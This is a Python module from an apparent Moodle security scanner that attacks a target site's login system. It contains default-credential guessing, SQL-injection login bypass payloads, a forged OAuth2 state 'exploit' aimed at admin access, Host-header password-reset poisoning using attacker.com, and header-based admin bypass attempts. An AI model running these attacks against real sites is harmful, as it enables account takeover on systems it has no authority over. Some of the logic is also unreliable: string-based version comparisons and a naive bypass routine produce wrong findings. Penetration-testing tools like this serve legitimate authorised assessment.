#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Module for testing authentication vulnerabilities in Moodle
Part of the Moodle Security Scanner project
"""

import re
import requests
import logging
import time
from typing import Dict, List, Optional, Any, Union, Tuple, Set
from requests.exceptions import RequestException, Timeout, ConnectionError
from bs4 import BeautifulSoup
import urllib.parse
import json
import hashlib

class MoodleAuthTester:
    """Class for testing authentication vulnerabilities in Moodle LMS installations"""
    
    def __init__(
        self, 
        target_url: str, 
        logger: Optional[logging.Logger] = None, 
        username: Optional[str] = None, 
        password: Optional[str] = None, 
        timeout: int = 30, 
        proxy: Optional[str] = None, 
        cookies: Optional[Dict[str, str]] = None, 
        delay: float = 0,
        user_agent: Optional[str] = None,
        verify_ssl: bool = True
    ) -> None:
        """Initialize the Moodle authentication tester
        
        Args:
            target_url: Target Moodle URL
            logger: Logger instance
            username: Username for authentication tests
            password: Password for authentication tests
            timeout: Request timeout in seconds
            proxy: Proxy URL
            cookies: Dictionary of cookies
            delay: Delay between requests in seconds
            user_agent: User agent string to use
            verify_ssl: Whether to verify SSL certificates
        """
        self.target_url = target_url.rstrip('/')
        self.username = username
        self.password = password
        self.timeout = timeout
        self.proxy = proxy
        self.cookies = cookies or {}
        self.delay = delay
        self.user_agent = user_agent
        self.verify_ssl = verify_ssl
        self.version_info: Optional[Dict[str, Any]] = None
        
        # Common test credentials - format includes description for reporting
        self.test_credentials: List[Dict[str, str]] = [
            {"username": "admin", "password": "admin", "description": "default admin credentials"},
            {"username": "admin", "password": "password", "description": "simple admin password"},
            {"username": "admin", "password": "Password123", "description": "common admin password"},
            {"username": "admin", "password": "moodle", "description": "product name as password"},
            {"username": "guest", "password": "", "description": "empty guest password"},
            {"username": "admin", "password": "changeme", "description": "temporary default password"}
        ]
        
        # SQL injection patterns for auth bypass - organized by type
        self.sql_injection_payloads: List[Dict[str, str]] = [
            # Comment-based bypasses
            {"username": "admin' --", "password": "anything", "type": "comment"},
            {"username": "admin' #", "password": "anything", "type": "comment"},
            {"username": "admin'/*", "password": "anything", "type": "comment"},
            
            # OR-based bypasses
            {"username": "admin' OR '1'='1' --", "password": "anything", "type": "or_condition"},
            {"username": "' OR '1'='1' --", "password": "anything", "type": "or_condition"},
            {"username": "' OR 1=1 --", "password": "anything", "type": "or_condition"},
            {"username": "admin' OR 1=1 #", "password": "anything", "type": "or_condition"},
            
            # Whitespace obfuscation
            {"username": "admin'/**/OR/**/1=1/**/--", "password": "anything", "type": "obfuscation"},
            {"username": "admin'%20OR%201=1%20--", "password": "anything", "type": "obfuscation"},
            
            # UNION-based attempts
            {"username": "' UNION SELECT 'admin','password' --", "password": "anything", "type": "union"}
        ]
        
        # Set up logging
        if logger:
            self.logger = logger
        else:
            self.logger = logging.getLogger("MoodleAuthTester")
            self.logger.setLevel(logging.INFO)
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            self.logger.addHandler(handler)
        
        # Initialize HTTP session with security settings
        self.session = requests.Session()
        
        # Configure the session
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        
        if cookies:
            self.session.cookies.update(cookies)
            
        # Set a secure default user agent if none provided
        if user_agent:
            self.session.headers.update({"User-Agent": user_agent})
        else:
            self.session.headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            })
            
        # Add security-related headers
        self.session.headers.update({
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
        })
        
        # Tracking for login attempts to prevent account lockouts
        self._login_attempts: Dict[str, int] = {}
        self._max_attempts_per_account = 3
    
    def set_version_info(self, version_info: Dict[str, Any]) -> None:
        """Set version information to guide testing
        
        Args:
            version_info: Dictionary containing Moodle version information
        """
        self.version_info = version_info
        self.logger.debug(f"Set version info: {version_info.get('version', 'Unknown')}")
    
    def run_tests(self) -> Dict[str, List[Dict[str, Any]]]:
        """
        Run all authentication tests
        
        Returns:
            Dictionary with vulnerabilities and information
        """
        self.logger.info("Running authentication vulnerability tests...")
        
        results = {
            "vulnerabilities": [],
            "info": []
        }
        
        try:
            # Test with provided credentials if available
            if self.username and self.password:
                self.logger.info(f"Testing authentication with provided credentials: {self.username}")
                auth_result = self.test_authentication(self.username, self.password)
                if auth_result:
                    results["info"].append({
                        "title": "Successful Authentication",
                        "description": f"Successfully authenticated with provided credentials ({self.username}).",
                        "severity": "Info"
                    })
                    self.logger.info(f"Successfully authenticated with provided credentials ({self.username}).")
            
            # Test for common credentials
            weak_credentials = self.test_common_credentials()
            if weak_credentials:
                results["vulnerabilities"].append({
                    "title": "Weak Default Credentials",
                    "description": f"The Moodle installation uses common or default credentials: {weak_credentials['username']}:{weak_credentials['password']}",
                    "severity": "Critical",
                    "evidence": f"Successfully authenticated with {weak_credentials['username']}:{weak_credentials['password']} ({weak_credentials.get('description', '')})",
                    "remediation": "Change default credentials and implement a strong password policy.",
                    "cwe": "CWE-521"
                })
            
            # Test for OAuth2 bypass vulnerability
            oauth_vuln = self.test_oauth2_bypass()
            if oauth_vuln:
                results["vulnerabilities"].append(oauth_vuln)
            
            # Test for SQL injection in login form
            sql_vuln = self.test_sql_injection_auth_bypass()
            if sql_vuln:
                results["vulnerabilities"].append(sql_vuln)
            
            # Test for password reset vulnerabilities
            reset_vuln = self.test_password_reset_vulnerability()
            if reset_vuln:
                results["vulnerabilities"].append(reset_vuln)
            
            # Test for authentication bypass via Host header manipulation
            host_vuln = self.test_host_header_auth_bypass()
            if host_vuln:
                results["vulnerabilities"].append(host_vuln)
            
            # Test for CSRF token weaknesses
            token_vuln = self.test_csrf_token_weaknesses()
            if token_vuln:
                results["vulnerabilities"].append(token_vuln)
            
            # Test for session fixation
            session_fix_vuln = self.test_session_fixation()
            if session_fix_vuln:
                results["vulnerabilities"].append(session_fix_vuln)
            
            # Add information about the testing
            if not results["vulnerabilities"]:
                results["info"].append({
                    "title": "Authentication Security",
                    "description": "No authentication vulnerabilities were found during testing.",
                    "severity": "Info"
                })
        
        except Exception as e:
            self.logger.error(f"Error during authentication testing: {str(e)}")
            results["info"].append({
                "title": "Authentication Testing Error",
                "description": f"An error occurred during authentication testing: {str(e)}",
                "severity": "Info"
            })
        
        self.logger.info(f"Authentication vulnerability testing completed. Found {len(results['vulnerabilities'])} vulnerabilities.")
        return results
    
    def test_authentication(self, username: str, password: str) -> bool:
        """Test authentication with specific credentials
        
        Args:
            username: Username to test
            password: Password to test
            
        Returns:
            Boolean indicating if authentication was successful
        """
        if not username:
            return False
            
        # Prevent excessive login attempts that might trigger account lockout
        account_hash = hashlib.md5(username.encode()).hexdigest()
        if self._login_attempts.get(account_hash, 0) >= self._max_attempts_per_account:
            self.logger.debug(f"Skipping login for {username} - maximum attempts reached")
            return False
            
        self._login_attempts[account_hash] = self._login_attempts.get(account_hash, 0) + 1
        
        self.logger.debug(f"Testing authentication with {username}")
        
        # First, get the login form to extract any tokens
        login_url = f"{self.target_url}/login/index.php"
        
        try:
            response = self._safe_request("get", login_url)
            
            if not response or response.status_code != 200:
                self.logger.debug(f"Could not access login page: {response.status_code if response else 'No response'}")
                return False
            
            # Extract login token if present
            soup = BeautifulSoup(response.text, 'html.parser')
            token_input = soup.find("input", {"name": "logintoken"})
            
            if token_input:
                logintoken = token_input.get("value", "")
                self.logger.debug(f"Found logintoken: {logintoken}")
            else:
                logintoken = ""
                self.logger.debug("No logintoken found")
            
            # Prepare login data
            login_data = {
                "username": username,
                "password": password,
                "logintoken": logintoken
            }
            
            # Submit login form
            if self.delay > 0:
                time.sleep(self.delay)
            
            response = self._safe_request("post", login_url, data=login_data)
            
            if not response:
                return False
                
            # Check if login was successful
            if "loginerrors" in response.text or "Invalid login" in response.text:
                self.logger.debug(f"Login failed with {username}")
                return False
            
            # Check if redirected to dashboard or my page
            if "/my/" in response.url or "Dashboard" in response.text or "My courses" in response.text:
                self.logger.info(f"Login successful with {username}")
                return True
            
            # Additional check for admin access
            admin_response = self._safe_request("get", f"{self.target_url}/admin/index.php")
            if admin_response and admin_response.status_code == 200 and "Site administration" in admin_response.text:
                self.logger.warning(f"Login successful with ADMIN privileges using {username}")
                return True
            
            return False
            
        except Exception as e:
            self.logger.error(f"Error during authentication test: {str(e)}")
            return False
    
    def _safe_request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        """Make a safe HTTP request with error handling and delay
        
        Args:
            method: HTTP method (get, post)
            url: URL to request
            **kwargs: Additional arguments for requests
            
        Returns:
            Response object or None if request failed
        """
        if self.delay > 0:
            time.sleep(self.delay)
            
        try:
            kwargs.setdefault('timeout', self.timeout)
            kwargs.setdefault('verify', self.verify_ssl)
            
            response = self.session.request(method, url, **kwargs)
            return response
            
        except Timeout:
            self.logger.debug(f"Request timeout for {url}")
        except ConnectionError:
            self.logger.debug(f"Connection error for {url}")
        except RequestException as e:
            self.logger.debug(f"Request error for {url}: {str(e)}")
        except Exception as e:
            self.logger.debug(f"Unexpected error during request to {url}: {str(e)}")
            
        return None
    
    def test_common_credentials(self):
        """Test if common/default credentials work"""
        self.logger.info("Testing for common/default credentials...")
        
        for creds in self.test_credentials:
            if self.delay > 0:
                time.sleep(self.delay)
            
            if self.test_authentication(creds["username"], creds["password"]):
                self.logger.warning(f"Found working common credentials: {creds['username']}:{creds['password']}")
                return creds
        
        self.logger.info("No common credentials worked")
        return None
    
    def test_oauth2_bypass(self):
        """Test for OAuth2 bypass vulnerability (CVE-2023-46806)"""
        self.logger.info("Testing for OAuth2 authentication bypass...")
        
        # Check if OAuth2 authentication is enabled
        oauth_url = f"{self.target_url}/auth/oauth2/login.php"
        response = self.session.get(oauth_url, timeout=self.timeout)
        
        if response.status_code != 200 or "OAuth 2" not in response.text:
            self.logger.debug("OAuth2 authentication not enabled or not accessible")
            return None
        
        # Check if version is vulnerable (affects Moodle < 4.2.2, < 4.1.5, < 4.0.11)
        if self.version_info and self.version_info.get("version"):
            version = self.version_info.get("version")
            # Check if version matches vulnerable range
            vulnerable = False
            if version.startswith("4.2") and version < "4.2.2":
                vulnerable = True
            elif version.startswith("4.1") and version < "4.1.5":
                vulnerable = True
            elif version.startswith("4.0") and version < "4.0.11":
                vulnerable = True
            
            if vulnerable:
                self.logger.warning(f"Moodle version {version} may be vulnerable to OAuth2 authentication bypass")
                return {
                    "title": "OAuth2 Authentication Bypass Vulnerability",
                    "description": "The Moodle installation appears to be running a version vulnerable to CVE-2023-46806. "
                                "This vulnerability allows attackers to bypass authentication via the OAuth2 module.",
                    "severity": "Critical",
                    "cve": "CVE-2023-46806",
                    "evidence": f"Moodle version {version} detected, which is in the vulnerable range. OAuth2 is enabled.",
                    "remediation": "Update to Moodle versions 4.2.2, 4.1.5, 4.0.11 or later.",
                    "references": [
                        "https://moodle.org/mod/forum/discuss.php?d=447992"
                    ]
                }
        
        # If we couldn't determine vulnerability based on version, attempt the actual exploit
        try:
            # Step 1: Access OAuth endpoint
            params = {
                "id": "1",
                "wantsurl": f"{self.target_url}/admin/",
                "sesskey": "random"
            }
            
            response = self.session.get(oauth_url, params=params, timeout=self.timeout)
            
            # Step 2: Analyze the redirect to extract state parameter
            if "state=" in response.url:
                parsed_url = urllib.parse.urlparse(response.url)
                query_params = urllib.parse.parse_qs(parsed_url.query)
                
                if 'state' in query_params:
                    # Create malicious state parameter
                    malicious_state = urllib.parse.quote(json.dumps({
                        "sesskey": "random",
                        "wantsurl": f"{self.target_url}/admin/",
                        "username": "admin",
                        "admin": True,
                        "role": "admin"
                    }))
                    
                    # Try different callback URLs
                    callback_urls = [
                        f"{self.target_url}/auth/oauth2/callback.php",
                        f"{self.target_url}/admin/tool/oauth2/login.php"
                    ]
                    
                    for callback_url in callback_urls:
                        if self.delay > 0:
                            time.sleep(self.delay)
                        
                        params = {
                            "state": malicious_state,
                            "code": "BYPASS"
                        }
                        response = self.session.get(callback_url, params=params, timeout=self.timeout)
                        
                        # Check if we got admin access
                        admin_response = self.session.get(f"{self.target_url}/admin/index.php", timeout=self.timeout)
                        if admin_response.status_code == 200 and "Site administration" in admin_response.text:
                            self.logger.warning("OAuth2 authentication bypass successful!")
                            return {
                                "title": "OAuth2 Authentication Bypass Vulnerability",
                                "description": "The Moodle installation is vulnerable to an OAuth2 authentication bypass vulnerability. "
                                             "This vulnerability allows attackers to bypass authentication and gain administrative access.",
                                "severity": "Critical",
                                "cve": "CVE-2023-46806",
                                "evidence": "Successfully bypassed authentication using OAuth2 state parameter manipulation.",
                                "remediation": "Update to Moodle versions 4.2.2, 4.1.5, 4.0.11 or later.",
                                "references": [
                                    "https://moodle.org/mod/forum/discuss.php?d=447992"
                                ]
                            }
        except Exception as e:
            self.logger.debug(f"Error testing OAuth2 bypass: {str(e)}")
        
        return None
    
    def test_sql_injection_auth_bypass(self):
        """Test for SQL injection vulnerabilities in login form"""
        self.logger.info("Testing for SQL injection authentication bypass...")
        
        for payload in self.sql_injection_payloads:
            if self.delay > 0:
                time.sleep(self.delay)
            
            if self.test_authentication(payload["username"], payload["password"]):
                self.logger.warning(f"SQL injection authentication bypass successful with: {payload['username']}")
                return {
                    "title": "SQL Injection Authentication Bypass",
                    "description": "The Moodle login form is vulnerable to SQL injection, allowing attackers to bypass authentication.",
                    "severity": "Critical",
                    "evidence": f"Successfully authenticated using SQL injection payload: {payload['username']}",
                    "remediation": "Update to the latest Moodle version and ensure proper input validation is in place."
                }
        
        self.logger.info("No SQL injection authentication bypass vulnerabilities found")
        return None
    
    def test_password_reset_vulnerability(self):
        """Test for vulnerabilities in password reset functionality"""
        self.logger.info("Testing for password reset vulnerabilities...")
        
        # Check if password reset functionality is accessible
        reset_url = f"{self.target_url}/login/forgot_password.php"
        response = self.session.get(reset_url, timeout=self.timeout)
        
        if response.status_code != 200 or "Reset password" not in response.text:
            self.logger.debug("Password reset functionality not accessible")
            return None
        
        # Extract the form token
        soup = BeautifulSoup(response.text, 'html.parser')
        token_input = soup.find("input", {"name": "logintoken"})
        
        if token_input:
            logintoken = token_input.get("value", "")
        else:
            logintoken = ""
        
        # Test for user enumeration through password reset
        test_usernames = ["admin", "administrator", "root", "user", "student", "teacher"]
        for username in test_usernames:
            if self.delay > 0:
                time.sleep(self.delay)
            
            # Submit password reset request
            reset_data = {
                "username": username,
                "logintoken": logintoken
            }
            
            reset_response = self.session.post(reset_url, data=reset_data, timeout=self.timeout)
            
            # Check for username enumeration
            if "If the username and email address match" in reset_response.text:
                # This is a generic message, which is good
                pass
            elif "We found too many users with this email address" in reset_response.text:
                # Found multiple users with the same email - information disclosure
                return {
                    "title": "User Enumeration via Password Reset",
                    "description": "The password reset functionality discloses information about existing usernames.",
                    "severity": "Medium",
                    "evidence": f"The system indicated multiple users with the same email for username: {username}",
                    "remediation": "Modify the password reset functionality to use generic messages that don't disclose user information."
                }
            elif "No users have that username" in reset_response.text:
                # Direct indication that username doesn't exist - information disclosure
                return {
                    "title": "User Enumeration via Password Reset",
                    "description": "The password reset functionality allows enumeration of valid usernames.",
                    "severity": "Medium",
                    "evidence": f"The system directly indicated that username '{username}' doesn't exist.",
                    "remediation": "Modify the password reset functionality to use generic messages that don't disclose user information."
                }
        
        # Test for Host header manipulation in password reset
        reset_headers = {
            "Host": "attacker.com",
            "X-Forwarded-Host": "attacker.com"
        }
        
        reset_data = {
            "username": "admin",
            "logintoken": logintoken
        }
        
        if self.delay > 0:
            time.sleep(self.delay)
        
        reset_response = self.session.post(reset_url, data=reset_data, headers=reset_headers, timeout=self.timeout)
        
        # If the response doesn't contain an error about the domain, it might be vulnerable
        # This is a passive check, so we're being conservative
        if "attacker.com" in reset_response.text:
            return {
                "title": "Password Reset Host Header Injection",
                "description": "The password reset functionality may be vulnerable to Host header injection, "
                             "which could allow attackers to receive password reset links for other users.",
                "severity": "High",
                "evidence": "The system accepted a modified Host header in the password reset request.",
                "remediation": "Modify the password reset functionality to use hardcoded URLs rather than ones "
                              "derived from the HTTP Host header."
            }
        
        self.logger.info("No password reset vulnerabilities found")
        return None
    
    def test_host_header_auth_bypass(self):
        """Test for authentication bypass via Host header manipulation"""
        self.logger.info("Testing for Host header authentication bypass...")
        
        # Attempt to bypass authentication by manipulating Host header
        login_url = f"{self.target_url}/login/index.php"
        admin_url = f"{self.target_url}/admin/index.php"
        
        # Test headers
        test_headers = [
            {"Host": "localhost"},
            {"Host": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Forwarded-Host": "127.0.0.1"},
            {"X-Original-URL": "/admin/index.php"},
            {"X-Rewrite-URL": "/admin/index.php"}
        ]
        
        for headers in test_headers:
            if self.delay > 0:
                time.sleep(self.delay)
            
            # Try to access admin page with manipulated headers
            response = self.session.get(admin_url, headers=headers, timeout=self.timeout)
            
            # Check if we got access
            if response.status_code == 200 and "Site administration" in response.text:
                self.logger.warning(f"Host header authentication bypass successful with: {headers}")
                return {
                    "title": "Host Header Authentication Bypass",
                    "description": "The Moodle installation is vulnerable to authentication bypass via Host header manipulation.",
                    "severity": "Critical",
                    "evidence": f"Successfully accessed admin area using modified headers: {headers}",
                    "remediation": "Configure the web server to validate Host headers and update Moodle to the latest version."
                }
        
        self.logger.info("No Host header authentication bypass vulnerabilities found")
        return None
    
    def test_csrf_token_weaknesses(self):
        """Test for weaknesses in CSRF token implementation"""
        self.logger.info("Testing for CSRF token weaknesses...")
        
        # Get the login page to extract the token
        login_url = f"{self.target_url}/login/index.php"
        response = self.session.get(login_url, timeout=self.timeout)
        
        if response.status_code != 200:
            self.logger.debug("Could not access login page")
            return None
        
        # Extract login token
        soup = BeautifulSoup(response.text, 'html.parser')
        token_input = soup.find("input", {"name": "logintoken"})
        
        if not token_input:
            self.logger.warning("No CSRF token found in login form!")
            return {
                "title": "Missing CSRF Protection",
                "description": "The Moodle login form doesn't include CSRF tokens, making it vulnerable to cross-site request forgery attacks.",
                "severity": "High",
                "evidence": "No logintoken field found in the login form.",
                "remediation": "Update to the latest Moodle version which includes proper CSRF protection."
            }
        
        # Check token value
        token = token_input.get("value", "")
        
        if len(token) < 20:
            self.logger.warning(f"CSRF token appears to be weak (length: {len(token)})")
            return {
                "title": "Weak CSRF Token",
                "description": "The Moodle CSRF tokens appear to be too short, potentially making them easier to guess or brute force.",
                "severity": "Medium",
                "evidence": f"Login token length is only {len(token)} characters.",
                "remediation": "Update to the latest Moodle version which includes stronger CSRF protection."
            }
        
        # Test if empty token is accepted
        login_data = {
            "username": "admin",
            "password": "wrongpassword",
            "logintoken": ""
        }
        
        if self.delay > 0:
            time.sleep(self.delay)
        
        empty_token_response = self.session.post(login_url, data=login_data, timeout=self.timeout)
        
        # For non-vulnerable systems, submitting an empty token should result in an error
        # If we can still see the login form (username field) without any token error, it might be accepting empty tokens
        if "username" in empty_token_response.text and "Invalid token" not in empty_token_response.text:
            self.logger.warning("Empty CSRF token accepted!")
            return {
                "title": "CSRF Protection Bypass",
                "description": "The Moodle installation appears to accept empty CSRF tokens, making it vulnerable to cross-site request forgery attacks.",
                "severity": "High",
                "evidence": "The system processed a login form with an empty token without reporting a token error.",
                "remediation": "Update to the latest Moodle version and ensure proper CSRF protection is configured."
            }
        
        self.logger.info("No CSRF token weaknesses found")
        return None
    
    def test_session_fixation(self):
        """Test for session fixation vulnerabilities"""
        self.logger.info("Testing for session fixation vulnerabilities...")
        
        # Get a session cookie
        login_url = f"{self.target_url}/login/index.php"
        response = self.session.get(login_url, timeout=self.timeout)
        
        if response.status_code != 200:
            self.logger.debug("Could not access login page")
            return None
        
        # Check if we have a session cookie
        if 'MoodleSession' not in self.session.cookies:
            self.logger.debug("No MoodleSession cookie found")
            return None
        
        # Store the pre-login session
        pre_login_session = self.session.cookies.get('MoodleSession')
        
        # Now attempt to login with valid credentials
        if self.username and self.password:
            # Extract login token
            soup = BeautifulSoup(response.text, 'html.parser')
            token_input = soup.find("input", {"name": "logintoken"})
            
            if token_input:
                logintoken = token_input.get("value", "")
            else:
                logintoken = ""
            
            login_data = {
                "username": self.username,
                "password": self.password,
                "logintoken": logintoken
            }
            
            if self.delay > 0:
                time.sleep(self.delay)
            
            login_response = self.session.post(login_url, data=login_data, timeout=self.timeout)
            
            # Check if login was successful
            if "/my/" in login_response.url or "Dashboard" in login_response.text:
                # Check if session cookie changed after login
                post_login_session = self.session.cookies.get('MoodleSession')
                
                if pre_login_session == post_login_session:
                    self.logger.warning("Session fixation vulnerability detected!")
                    return {
                        "title": "Session Fixation Vulnerability",
                        "description": "The Moodle installation does not change session cookies during login, making it vulnerable to session fixation attacks.",
                        "severity": "High",
                        "evidence": f"Session cookie remains the same before and after login: {pre_login_session}",
                        "remediation": "Update to the latest Moodle version and ensure session regeneration is configured properly."
                    }
        
        self.logger.info("No session fixation vulnerabilities found")
        return None 